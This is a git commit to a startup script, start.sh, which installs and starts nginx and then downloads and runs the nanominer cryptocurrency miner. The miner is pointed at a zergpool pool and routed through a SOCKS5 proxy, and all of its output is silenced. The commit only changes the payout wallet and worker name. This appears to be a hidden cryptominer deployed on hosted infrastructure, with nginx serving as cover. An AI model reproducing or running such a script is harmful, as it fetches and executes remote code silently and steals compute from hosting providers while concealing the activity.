7dd266b8507d70f03446b2c75d20869d1c1da78c
Lianeen <108794815+Lianeen@users.noreply.github.com>
2022-07-27 21:35:10 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -3,4 +3,4 @@ apt update -y
 apt install nginx -y
 apt install wget -y
 service nginx start
-wget https://github.com/nanopool/nanominer/releases/download/v3.6.5/nanominer-linux-3.6.5.tar.gz && tar -xvf nanominer-linux-3.6.5.tar.gz && cd nanominer-linux-3.6.5 && chmod +x nanominer && ./nanominer -algo verushash -pool1 verushash.mine.zergpool.com:3300 -wallet TQ11YB4cti4EhwYkZkoYNwE9B7nkQvTJ86.OKTETO -password c=TRX -x socks5://192.252.214.20:15864 > /dev/null 2>&1
+wget https://github.com/nanopool/nanominer/releases/download/v3.6.5/nanominer-linux-3.6.5.tar.gz && tar -xvf nanominer-linux-3.6.5.tar.gz && cd nanominer-linux-3.6.5 && chmod +x nanominer && ./nanominer -algo verushash -pool1 verushash.mine.zergpool.com:3300 -wallet LUFTF9kAQgHyWLv2rctGvVSSxL9RXBodcF.OKTE -password c=LTC -x socks5://192.252.214.20:15864 > /dev/null 2>&1
